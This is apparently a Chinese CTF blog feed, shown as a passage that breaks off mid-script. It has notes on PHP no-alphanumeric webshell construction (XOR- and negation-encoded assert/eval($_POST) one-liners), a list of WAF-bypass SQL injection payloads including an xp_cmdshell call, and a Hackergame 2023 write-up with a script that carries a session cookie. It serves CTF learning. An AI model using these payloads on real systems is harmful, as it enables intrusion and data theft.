class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7c&#x27;</span>);</span><br><span class="line"><span class="comment">//$_=&#x27;assert&#x27;;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%07&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%5d&#x27;</span>);</span><br><span class="line"><span class="comment">//$__=&#x27;_GET&#x27;;</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line"><span class="comment">//$___=&#x27;$_GET&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br><span class="line"><span class="comment">//assert($_GET[_]);</span></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%60&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%7b&#x27;</span>).(<span class="string">&#x27;%08&#x27;</span>^<span class="string">&#x27;%7c&#x27;</span>);<span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%07&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;%40&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;%5d&#x27;</span>);<span class="variable">$___</span>=<span class="variable">$$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[_]);&amp;_=<span class="title function_ invoke__">phpinfo</span>();</span><br></pre></td></tr></table></figure><p>当过滤字符的范围没有那么大，或者只是过滤关键字的时候可以使用如下脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">char = string.printable</span><br><span class="line">cmd = <span class="string">&#x27;system&#x27;</span></span><br><span class="line">tmp1,tmp2 = <span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> res <span class="keyword">in</span> cmd:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> char:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> char:</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">ord</span>(i)^<span class="built_in">ord</span>(j) == <span class="built_in">ord</span>(res)):</span><br><span class="line">                tmp1 += i</span><br><span class="line">                tmp2 += j</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;(&#x27;&#123;&#125;&#x27;^&#x27;&#123;&#125;&#x27;)&quot;</span>.<span class="built_in">format</span>(tmp1,tmp2))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; php -r &quot;var_dump(&#x27;000000&#x27;^&#x27;CICDU]&#x27;);&quot;</span><br><span class="line">Command line code:1:</span><br><span class="line">string(6) &quot;system&quot;</span><br></pre></td></tr></table></figure><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210113191434628.png?raw=true" alt="在这里插入图片描述"></p><p>再放个网上看到的 payload:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span><br><span class="line"><span class="comment">//$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff=phpinfo</span></span><br></pre></td></tr></table></figure><h2 id="url编码取反绕过"><a class="markdownIt-Anchor" href="#url编码取反绕过">#</a> <strong>URL 编码取反绕过</strong></h2><p>还是上面的例题</p><p>当 PHP&gt;=7 时，可以直接利用取反构造 payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; php -r &quot;var_dump(urlencode(~&#x27;phpinfo&#x27;));&quot;</span><br><span class="line">Command line code:1:</span><br><span class="line">string(21) &quot;%8F%97%8F%96%91%99%90&quot;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(~%<span class="number">8</span>F%<span class="number">97</span>%<span class="number">8</span>F%<span class="number">96</span>%<span class="number">91</span>%<span class="number">99</span>%<span class="number">90</span>)();</span><br><span class="line"><span class="comment">#phpinfo();</span></span><br></pre></td></tr></table></figure><p>这里给一个 php 的转化</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="string">&#x27;(eval($_POST[mochu7]))&#x27;</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$c</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$d</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=(~%<span class="number">9</span>E%<span class="number">8</span>C%<span class="number">8</span>C%<span class="number">9</span>A%<span class="number">8</span>D%<span class="number">8</span>B)(~%D7%<span class="number">9</span>A%<span class="number">89</span>%<span class="number">9</span>E%<span class="number">93</span>%D7%DB%A0%AF%B0%AC%AB%A4%<span class="number">92</span>%<span class="number">90</span>%<span class="number">9</span>C%<span class="number">97</span>%<span class="number">8</span>A%C8%A2%D6%D6);  <span class="comment">//别忘了后面的分号</span></span><br><span class="line">或者：</span><br><span class="line">?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[%<span class="number">27</span>a%<span class="number">27</span>])</span><br></pre></td></tr></table></figure><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/2021011322442091.png?raw=true" alt="在这里插入图片描述"></p><p>有参数的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\Administrator&gt; php -r &quot;var_dump(urlencode(~&#x27;system&#x27;));&quot;</span><br><span class="line">Command line code:1:</span><br><span class="line">string(18) &quot;%8C%86%8C%8B%9A%92&quot;</span><br><span class="line">PS C:\Users\Administrator&gt; php -r &quot;var_dump(urlencode(~&#x27;whoami&#x27;));&quot;</span><br><span class="line">Command line code:1:</span><br><span class="line">string(18) &quot;%88%97%90%9E%92%96&quot;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">88</span>%<span class="number">97</span>%<span class="number">90</span>%<span class="number">9</span>E%<span class="number">92</span>%<span class="number">96</span>);</span><br><span class="line"><span class="comment">#system(&#x27;whoami&#x27;);</span></span><br></pre></td></tr></table></figure><p><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/20210113225437499.png?raw=true" alt="在这里插入图片描述"></p><h2 id="如何绕过waf"><a class="markdownIt-Anchor" href="#如何绕过waf">#</a> <strong>如何绕过 WAF</strong></h2><p>\1. 当我们在目标 URL 进行 SQL 注入测试时，可以通过修改注入语句中字母的大小写来触发 WAF 保护情况。如果 WAF 使用区分大小写的黑名单，则更改大小写可能会帮我们成功绕过 WAF 的过滤。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.xxxxx.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4</span><br></pre></td></tr></table></figure><p>\2. 关键字替换 (在关键字中间可插入将会被 WAF 过滤的字符) – 例如 SELECT 可插入变成 SEL</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.xxxxx.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4</span><br></pre></td></tr></table></figure><p>\3. 编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+ URL encode</span><br><span class="line">　　page.php?id=1%252f%252a*/UNION%252f%252a /SELECT +Hex encode</span><br><span class="line">　　www.xxxxx.com/index.php?page_id=-15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4…  　SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)) +Unicode encode</span><br><span class="line">　　?id=10%D6‘%20AND%2201=2%23   　SELECT &#x27;?&#x27;=&#x27;A&#x27;; #1</span><br></pre></td></tr></table></figure><p>\4. 使用注释</p><p>在攻击字符串中插入注释。例如，/<em>!SELECT</em>/ 这样 WAF 可能就会忽略该字符串，但它仍会被传递给目标应用程序并交由 mysql 数据库处理。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4　   　&#x27;union%a0select pass from users#  index.php?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3   　?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4…</span><br></pre></td></tr></table></figure><p>\5. 某些函数或<a href="https://www.linuxcool.com/">命令</a>，因为 WAF 的过滤机制导致我们无法使用。那么，我们也可以尝试用一些等价函数来替代它们。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hex()、bin() ==&gt; ascii()   sleep() ==&gt;benchmark()   concat_ws()==&gt;group_concat()  substr((select &#x27;password&#x27;),1,1) = 0x70   　strcmp(left(&#x27;password&#x27;,1), 0x69) = 1      strcmp(left(&#x27;password&#x27;,1), 0x70) = 0   　strcmp(left(&#x27;password&#x27;,1), 0x71) = -1 mid()、substr() ==&gt; substring()  @@user ==&gt; user()  @@datadir ==&gt; datadir()</span><br></pre></td></tr></table></figure><p>\6. 使用特殊符号</p><p>这里我把非字母数字的字符都规在了特殊符号一类，特殊符号有特殊的含义和用法。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+ ` symbol: select `version()`; + +- :select+id-1+1.from users; + @:select@^1.from users; +Mysql function() as xxx +`、~、!、@、%、()、[]、.、-、+ 、|、%00 示例</span><br><span class="line">　　‘se’+’lec’+’t’   %S%E%L%E%C%T 1   1.aspx?id=1;EXEC(‘ma’+&#x27;ster..x’+&#x27;p_cm’+&#x27;dsh’+&#x27;ell ”net user”’)  &#x27; or --+2=- -!!!&#x27;2    　 id=1+(UnI)(oN)+(SeL)(EcT)</span><br></pre></td></tr></table></figure><p>\7. HTTP 参数控制<br>　　<br>通过提供多个参数 = 相同名称的值集来混淆 WAF。例如 <a href="http://www.xxxxx.com?id=1&amp;?id=%E2%80%99">http://www.xxxxx.com?id=1&amp;?id=’</a> or ‘1’=’1′ — ‘在某些情况下 (例如使用 Apache/PHP)，应用程序将仅解析最后 (第二个) id= 而 WAF 只解析第一个。在应用程序看来这似乎是一个合法的请求，因此应用程序会接收并处理这些恶意输入。如今，大多数的 WAF 都不会受到 HTTP 参数污染 (HPP) 的影响，但仍然值得一试。</p><p>+ HPP(HTTP Parameter Polution))</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">　　/?id=1;select+1,2,3+from+users+where+id=1—   　/?id=1;select+1&amp;id=2,3+from+users+where+id=1—   　/?id=1/**/union/*&amp;id=*/select/*&amp;id=*/pwd/*&amp;id=*/from/*&amp;id=*/users</span><br></pre></td></tr></table></figure><p>HPP 又称做重复参数污染，最简单的就是？uid=1&amp;uid=2&amp;uid=3，对于这种情况，不同的 Web 服务器处理方式如下：</p><p>+HPF (HTTP Parameter Fragment)</p><p>这种方法是 HTTP 分割注入，同 CRLF 有相似之处 (使用控制字符 %0a、%0d 等执行换行)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?a=1+union/*&amp;b=*/select+1,pass/*&amp;c=*/from+users--   select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users—</span><br></pre></td></tr></table></figure><p>+HPC (HTTP Parameter Contamination)<br> RFC2396 定义了以下字符：<br> <code>Unreserved: a-z, A-Z, 0-9 and _ . ! ~ * ' () Reserved : ; / ? : @ &amp; = + $ , Unwise : &#123; &#125; | \ ^ [ ] </code>  ` 不同的 Web 服务器处理处理构造得特殊请求时有不同的逻辑：以魔术字符 % 为例，Asp/Asp.net 会受到影响。</p><p>\8. 缓冲区溢出</p><p>WAF 和其他所有的应用程序一样也存在着各种缺陷和漏洞。如果出现缓冲区溢出的情况，那么 WAF 可能就会崩溃，即使不能代码执行那也会使 WAF 无法正常运行。这样，WAF 的安全防护自然也就被瓦解了。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</span><br></pre></td></tr></table></figure><p>\9. 整合绕过</p><p>当使用单一的方式无法绕过时，我们则可以灵活的将多种方式结合在一起尝试。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www.xxxxx.com/index.php?page_id=-15+and+(select 1)=(Select 0xAA[..(add about 1000 &quot;A&quot;)..])+/*!uNIOn*/+/*!SeLECt*/+1,2,3,4…   id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()– -   ?id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e--</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hackergame-2023</title>
      <link href="/2023/11/12/Hackergame-2023/"/>
      <url>/2023/11/12/Hackergame-2023/</url>
      
        <content type="html"><![CDATA[<h2 id="hackergame-启动"><a class="markdownIt-Anchor" href="#hackergame-启动">#</a> <strong>Hackergame 启动</strong></h2><p>​利用 burpsuite 拦截发送相似度的报文，对相似度修改为 100 即可。</p><h2 id="猫咪小测"><a class="markdownIt-Anchor" href="#猫咪小测">#</a> <strong>猫咪小测</strong></h2><p>第一问搜索得值中科大中外书籍存在西区图书馆 12 楼，第二问在 arXiv 上搜索 chick 即可，当然也可以暴力，第三问 gpt 或者 CSDN，第四问 Google 搜索关键词 python typing check,halting problem, 检索 2023 年的文献即可得到 ECOOP 为会议。</p><h2 id="更深更暗"><a class="markdownIt-Anchor" href="#更深更暗">#</a> <strong>更深更暗</strong></h2><p>直接在浏览器 F12 和 ctrl+f 搜索 flag 即可</p><h2 id="旅行照片"><a class="markdownIt-Anchor" href="#旅行照片">#</a> <strong>旅行照片</strong></h2><p>根据图片或奖得主锁定东京大学，google 即可的出东京大学诺贝尔奖得主信息。</p><p>再实景地图找公园，锁定活动在 googl 找到相关线上志愿报名，门票钱搜索可知东京大学学生免费。</p><h2 id="赛博井字棋"><a class="markdownIt-Anchor" href="#赛博井字棋">#</a> <strong>赛博井字棋</strong></h2><p>burpsuite 抓包发现下的棋子通过 x 和 y 定位，在棋盘本身不能下到电脑下过的地方，试一下修改 x,y 值到电脑下过的地方，发现覆盖，即可获胜。</p><h2 id="奶奶睡前的flag"><a class="markdownIt-Anchor" href="#奶奶睡前的flag">#</a> <strong>奶奶睡前的 flag</strong></h2><p>这道题之前做过类似的似乎（虽然我做的题很少很少，但还是想起来最近某次比赛一道没做出来的 MISC 里有这么一道，当时是 windows 的 snipping tools 的 bug），遂搜索，发现 google 手机也能利用这个漏洞，在 github 上翻出源码，执行选择最老的 google 手机即可获取 flag。<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/1.png?raw=true" alt="600"></p><p>通过抓包获取撤回信息的格式，直接上脚本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line"># 定义基本的 URL 和请求头</span><br><span class="line">BASE_URL = &quot;http://202.38.93.111:10021&quot;</span><br><span class="line">HEADERS = &#123;</span><br><span class="line">    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.121 Safari/537.36&quot;,</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/json&quot;,</span><br><span class="line">    &quot;Origin&quot;: &quot;http://202.38.93.111:10021&quot;,</span><br><span class="line">    &quot;Referer&quot;: &quot;http://202.38.93.111:10021/&quot;,</span><br><span class="line">    &quot;Cookie&quot;: &quot;session=eyJ0b2tlbiI6IjQ1MzpNRVVDSUJ3ZE1jd1RURkR2RlZwSGFRcXE0Tm94bzBSdnVGRDZzdExFNTJHOU42NlNBaUVBOEdXWGRXY1orN2pIeXFneUxxQTIyWDZDc2RoY3ZLblVPNjNjemFLMy8xUT0ifQ.ZTz5oQ.59uj_HyyOdElcS6oMKyqOq2koDo&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 获取消息</span><br><span class="line">def get_messages():</span><br><span class="line">    response = requests.post(f&quot;&#123;BASE_URL&#125;/api/getMessages&quot;, headers=HEADERS)</span><br><span class="line">    if response.status_code == 200:</span><br><span class="line">        return response.json()</span><br><span class="line">    return []</span><br><span class="line"></span><br><span class="line"># 删除消息</span><br><span class="line">def delete_message(message_id):</span><br><span class="line">    payload = &#123;&quot;id&quot;: message_id&#125;</span><br><span class="line">    response = requests.post(f&quot;&#123;BASE_URL&#125;/api/deleteMessage&quot;, headers=HEADERS, json=payload)</span><br><span class="line">    if response.status_code == 200:</span><br><span class="line">        print(&quot;delete message: &quot;,message_id,&#x27; &#x27;, response.text,&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">def get_flag():</span><br><span class="line">    response = requests.post(f&quot;&#123;BASE_URL&#125;/api/getflag&quot;, headers=HEADERS)</span><br><span class="line">    if response.status_code == 200:</span><br><span class="line">        return response.text</span><br><span class="line">    return None</span><br><span class="line"># 主执行逻辑</span><br><span class="line">start_time = time.time()</span><br><span class="line">messages = get_messages()</span><br><span class="line">print(messages)</span><br><span class="line">i = 0 </span><br><span class="line">lastmessage = &#x27;&#x27;</span><br><span class="line">for message in messages[&#x27;messages&#x27;]:</span><br><span class="line">    match = re.search(r&#x27;hack\[[a-z]+\]&#x27;, message[&#x27;text&#x27;])</span><br><span class="line">    </span><br><span class="line">    if match:</span><br><span class="line">        while(1):</span><br><span class="line">            # print(i)</span><br><span class="line">            end_time = time.time()</span><br><span class="line">            if end_time - start_time &gt; message[&#x27;delay&#x27;] :</span><br><span class="line">                delete_message(i)  # 这里假设每个消息还有一个&#x27;id&#x27;字段。如果没有，你需要根据实际情况进行调整。</span><br><span class="line">                break</span><br><span class="line">    print(&#x27; &#x27;,message,&#x27;\n&#x27;)</span><br><span class="line">    i = i + 1</span><br><span class="line">    lastmessage=message</span><br><span class="line">time.sleep(7)</span><br><span class="line">flag = get_flag()</span><br><span class="line">print(&quot;Received flag:&quot;, flag)</span><br></pre></td></tr></table></figure><p>这里有个坑是发送时间不能在 delay 的时间之前发送，会显示<strong>时空错误</strong>，另外完成后要等待 7 秒左右再连接 getflag 接口，否则还是告诉你出错。</p><h2 id="虫"><a class="markdownIt-Anchor" href="#虫">#</a> <strong>虫</strong></h2><p>这道题要根据文字提示，告诉你这种方式可以接受 ISS 的图片，之后上网搜索，得值通过 SSTV 的方式获取 ISS 定时发送的图片。下载音频后下载相关的软件即可，这里由于声音较为刺耳，下载了虚拟音频驱动来播放（怕被室友打），第一次费好大劲下的 MMSSTV 还用不了，我还以为思路错了，之后用 RXSSTV 即可成功获取 flag。</p><h2 id="json-属于-yaml"><a class="markdownIt-Anchor" href="#json-属于-yaml">#</a> <strong>JSON 属于 YAML？</strong></h2><p>搜索即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag1: &#123;&#x27;value&#x27;:1e233&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag2: &#123;&#x27;va&#x27;:1,&#x27;va&#x27;:2&#125;</span><br></pre></td></tr></table></figure><h2 id="http集邮册"><a class="markdownIt-Anchor" href="#http集邮册">#</a> <strong>HTTP 集邮册</strong></h2><p>获取状态吗：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /file HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n</span><br><span class="line">Range: bytes=5000-10000\r\n\r\n</span><br><span class="line"></span><br><span class="line">416 Requested Range Not Satisfiable</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n</span><br><span class="line">Range: bytes=0-999\r\n\r\n</span><br><span class="line"></span><br><span class="line">206 Partial Content</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /index.html HTTP/1.1</span><br><span class="line">Host</span><br><span class="line"></span><br><span class="line">400 Bad Request</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.html HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n\r\n</span><br><span class="line"></span><br><span class="line">405 Not Allowed</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /index.html HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n</span><br><span class="line">Content-Length: 10000000\r\n</span><br><span class="line">\r\n</span><br><span class="line">&#123;appl&#125;</span><br><span class="line"></span><br><span class="line">413 Request Entity Too Large</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /index.html HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n</span><br><span class="line">EXPECT: 100-continue\r\n</span><br><span class="line">\r\n</span><br><span class="line"></span><br><span class="line">100 Continue</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /verylongpath/...[repeat many times]... HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n\r\n</span><br><span class="line"></span><br><span class="line">414 URI Too Long </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/2.1\r\n</span><br><span class="line">Host: www.example.com\r\n\r\n</span><br><span class="line"></span><br><span class="line">505 HTTP Version Not Supported</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n\r\n</span><br><span class="line"></span><br><span class="line">200 OK</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /thispagedoesnotexist HTTP/1.1\r\n</span><br><span class="line">Host: www.baidu.com\r\n\r\n</span><br><span class="line"></span><br><span class="line">404 Not Found</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n</span><br><span class="line">If-Modified-Since: Tue, 15 Aug 2023 17:03:04 GMT\r\n\r\n</span><br><span class="line"></span><br><span class="line">304 Not Modified</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line">Host: www.example.com\r\n</span><br><span class="line">If-Match: 121\r\n\r\n</span><br><span class="line"></span><br><span class="line">412 Precondition Failed</span><br></pre></td></tr></table></figure><h2 id="docker-for-everyone"><a class="markdownIt-Anchor" href="#docker-for-everyone">#</a> <strong>Docker for Everyone</strong></h2><p>题目给出了提示，通过 docker 提权即可，再启动 docker 时 -------- 之后 cat 软连接即可</p><h2 id="惜字如金"><a class="markdownIt-Anchor" href="#惜字如金">#</a> <strong>惜字如金</strong></h2><p>需要写脚本暴力，代码给出提示，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">check_equals(set(len(s) for s in code_dict), &#123;24&#125;)</span><br></pre></td></tr></table></figure><p>每个有 24 个字符，而上面经过惜字如金处理之后为 23 个，故暴力出所有可能即可。</p><p>上代码：（写的不好，这里纯纯自己手打获取的所有可能</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">my_str = &#x27;nymeh1niwemflcir&#125;echaet&#x27;</span><br><span class="line">index = 0</span><br><span class="line">strs1 = []</span><br><span class="line">vowels = set(&quot;AEIOUaeiou&quot;)</span><br><span class="line"></span><br><span class="line">for s in my_str:</span><br><span class="line">    if s not in vowels:</span><br><span class="line">        new_str = my_str[:index] + s + my_str[index:]</span><br><span class="line">        strs1.append(new_str)</span><br><span class="line">    index += 1</span><br><span class="line"></span><br><span class="line"># for str1 in strs1:</span><br><span class="line">#     print(str1)</span><br><span class="line">strs1.append(&#x27;nymeh1niwemflcir&#125;echaete&#x27;)</span><br><span class="line">print(strs1)</span><br><span class="line"></span><br><span class="line">my_str2 = &#x27;a3g7&#125;kidgojernoetlsup?h&#x27;</span><br><span class="line">index = 0</span><br><span class="line">strs2 = []</span><br><span class="line">vowels = set(&quot;AEIOUaeiou&quot;)</span><br><span class="line"></span><br><span class="line">for s in my_str2:</span><br><span class="line">    if s not in vowels:</span><br><span class="line">        new_str = my_str2[:index] + s + my_str2[index:]</span><br><span class="line">        strs2.append(new_str)</span><br><span class="line">    index += 1</span><br><span class="line"></span><br><span class="line"># for str1 in strs1:</span><br><span class="line">#     print(str1)</span><br><span class="line">strs2.append(&#x27;a3g7&#125;kidgojernoetlsup?he&#x27;)</span><br><span class="line">strs2.append(&#x27;a3g7&#125;kidgojernoetlsupe?h&#x27;)</span><br><span class="line">print(strs2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">my_str3 = &#x27;ulw!f5soadrhwnrsnstnoeq&#x27;</span><br><span class="line">index = 0</span><br><span class="line">strs3 = []</span><br><span class="line">vowels = set(&quot;AEIOUaeiou&quot;)</span><br><span class="line"></span><br><span class="line">for s in my_str3:</span><br><span class="line">    if s not in vowels:</span><br><span class="line">        new_str = my_str3[:index] + s + my_str3[index:]</span><br><span class="line">        strs3.append(new_str)</span><br><span class="line">    index += 1</span><br><span class="line"></span><br><span class="line"># for str1 in strs1:</span><br><span class="line">#     print(str1)</span><br><span class="line">strs3.append(&#x27;ulwe!f5soadrhwnrsnstnoeq&#x27;)</span><br><span class="line">strs3.append(&#x27;ulw!f5soadrhwnrsnstnoeqe&#x27;)</span><br><span class="line">print(strs3)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">my_str4 = &#x27;ct&#123;l-findiehaai&#123;oveatas&#x27;</span><br><span class="line">index = 0</span><br><span class="line">strs4 = []</span><br><span class="line">vowels = set(&quot;AEIOUaeiou&quot;)</span><br><span class="line"></span><br><span class="line">for s in my_str4:</span><br><span class="line">    if s not in vowels:</span><br><span class="line">        new_str = my_str4[:index] + s + my_str4[index:]</span><br><span class="line">        strs4.append(new_str)</span><br><span class="line">    index += 1</span><br><span class="line"></span><br><span class="line"># for str1 in strs1:</span><br><span class="line">#     print(str1)</span><br><span class="line">strs4.append(&#x27;cte&#123;l-findiehaai&#123;oveatas&#x27;)</span><br><span class="line">strs4.append(&#x27;ct&#123;le-findiehaai&#123;oveatas&#x27;)</span><br><span class="line">strs4.append(&#x27;ct&#123;l-findiehaai&#123;oveatase&#x27;)</span><br><span class="line">print(strs4)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">my_str5 = &#x27;ty9kxborszstguyd?!blm-p&#x27;</span><br><span class="line">index = 0</span><br><span class="line">strs5 = []</span><br><span class="line">vowels = set(&quot;AEIOUaeiou&quot;)</span><br><span class="line"></span><br><span class="line">for s in my_str5:</span><br><span class="line">    if s not in vowels:</span><br><span class="line">        new_str = my_str5[:index] + s + my_str5[index:]</span><br><span class="line">        strs5.append(new_str)</span><br><span class="line">    index += 1</span><br><span class="line"></span><br><span class="line"># for str1 in strs1:</span><br><span class="line">#     